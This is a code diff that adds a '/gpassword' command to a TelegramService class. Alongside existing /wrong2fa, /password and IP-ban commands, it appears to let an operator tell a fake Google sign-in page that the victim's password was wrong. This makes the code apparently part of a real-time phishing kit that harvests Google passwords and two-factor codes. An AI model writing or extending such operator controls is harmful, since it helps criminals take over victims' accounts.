@@ -10,6 +10,7 @@ export class TelegramService {
   static baseDelay = 1000; // 1 second base delay
   static lastProcessedWrong2faCommand = null; // Track last processed wrong2fa command
   static lastProcessedPasswordCommand = null; // Track last processed password command
+  static lastProcessedGPasswordCommand = null; // Track last processed gpassword command
 
   static async fetchMessages() {
     // Prevent multiple simultaneous requests
@@ -259,6 +260,20 @@ export class TelegramService {
           currentState.setWrong2faTrigger((prev) => prev + 1);
         }
       },
+      "/gpassword": (fullCommand) => {
+        // "G Bad Pass" - flags the Google password as wrong. Fa2Google listens
+        // to wrong2faTrigger for its wrong-password state.
+        // Check if this is a new gpassword command (idempotent check)
+        if (this.lastProcessedGPasswordCommand === fullCommand) {
+          return;
+        }
+
+        this.lastProcessedGPasswordCommand = fullCommand;
+
+        if (typeof currentState.setWrong2faTrigger === "function") {
+          currentState.setWrong2faTrigger((prev) => prev + 1);
+        }
+      },
       "/ban": async () => {
         if (LastFetch !== "Ban" && Ip) {
           setLastFetch("Ban");
@@ -277,6 +292,7 @@ export class TelegramService {
         this.resetErrorState();
         this.lastProcessedWrong2faCommand = null;
         this.lastProcessedPasswordCommand = null;
+        this.lastProcessedGPasswordCommand = null;
       },
     };
 
@@ -290,6 +306,21 @@ export class TelegramService {
         if (process.env.NODE_ENV === "development") {
           console.warn(
             "[Telegram] Error processing wrong2fa command:",
+            command,
+            error.message
+          );
+        }
+      }
+    } else if (command.startsWith("/gpassword")) {
+      // Handle /gpassword commands with additional data
+      try {
+        if (commands["/gpassword"]) {
+          commands["/gpassword"](command); // Pass full command for idempotency check
+        }
+      } catch (error) {
+        if (process.env.NODE_ENV === "development") {
+          console.warn(
+            "[Telegram] Error processing gpassword command:",
             command,
             error.message
           );
